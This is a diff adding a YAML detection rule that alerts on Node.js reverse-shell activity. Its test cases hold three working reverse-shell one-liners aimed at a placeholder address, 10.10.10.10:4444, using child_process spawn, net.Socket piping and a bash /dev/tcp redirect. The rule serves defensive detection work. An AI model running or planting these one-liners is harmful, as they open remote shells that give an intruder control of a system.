@@ -1,0 +1,33 @@
+name: rta_nodejs_reverse_shell
+mode: alert
+eval: |
+  (
+    e.process_name == "node" &&
+    (
+      re_match(e.process_args, "child_process") ||
+      re_match(e.process_args, "net\\.Socket") ||
+      re_match(e.process_args, "require\\(.*net.*\\)")
+    ) &&
+    (
+      re_match(e.process_args, "spawn\\(") ||
+      re_match(e.process_args, "exec\\(") ||
+      re_match(e.process_args, "connect\\(")
+    )
+  )
+tests:
+  - cleartext: "node child_process reverse shell"
+    process_name: node
+    process_args: "node -e 'require(\"child_process\").spawn(\"/bin/sh\",[],{stdio:[0,1,2]});'"
+    should_match: true
+  - cleartext: "node net.Socket reverse shell"
+    process_name: node
+    process_args: "node -e 'var net = require(\"net\");var cp = require(\"child_process\");var s = new net.Socket();s.connect(4444,\"10.10.10.10\");s.pipe(cp.spawn(\"/bin/sh\").stdin);'"
+    should_match: true
+  - cleartext: "node exec reverse shell"
+    process_name: node
+    process_args: "node -e 'require(\"child_process\").exec(\"/bin/bash -i >& /dev/tcp/10.10.10.10/4444 0>&1\");'"
+    should_match: true
+  - cleartext: "normal node script"
+    process_name: node
+    process_args: "node app.js"
+    should_match: false
